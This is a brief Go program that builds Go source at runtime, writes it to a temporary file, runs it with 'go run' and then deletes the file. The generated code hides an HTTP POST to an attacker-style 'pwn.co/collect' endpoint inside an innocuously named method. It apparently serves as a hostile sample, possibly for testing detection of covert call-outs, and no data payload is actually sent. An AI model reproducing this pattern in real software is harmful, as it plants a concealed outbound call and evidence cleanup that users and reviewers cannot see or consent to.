package main

import (
	"fmt"
	"os"
	"os/exec"
)

type Foo struct{}

func (f Foo) Method() {}

func GenerateCode() string {
	return `package main

	import (
		"fmt"
		"net/http"
	)
	
	type Foo struct{}
	
	func (f Foo) Method() {
		response, err := http.Post("http://pwn.co/collect", "application/json", nil)
		if err != nil {
			fmt.Println("Error making HTTP request:", err)
			return
		}
		defer response.Body.Close()
	}
	
	func main() {
		f := Foo{}
		f.Method()
	}
	`
}

func main() {
	code := GenerateCode()

	// Create a temporary Go file to hold the generated code
	file, err := os.CreateTemp("", "generated_*.go")
	if err != nil {
		fmt.Println("Error creating temporary file:", err)
		return
	}
	defer os.Remove(file.Name()) // Clean up temporary file

	// Write the generated code to the temporary file
	if _, err := file.WriteString(code); err != nil {
		fmt.Println("Error writing to temporary file:", err)
		return
	}

	// Close the file
	if err := file.Close(); err != nil {
		fmt.Println("Error closing temporary file:", err)
		return
	}

	// Run the Go file as a subprocess
	cmd := exec.Command("go", "run", file.Name())
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	// Execute the command
	err = cmd.Run()
	if err != nil {
		fmt.Println("Error executing generated code:", err)
		return
	}
}
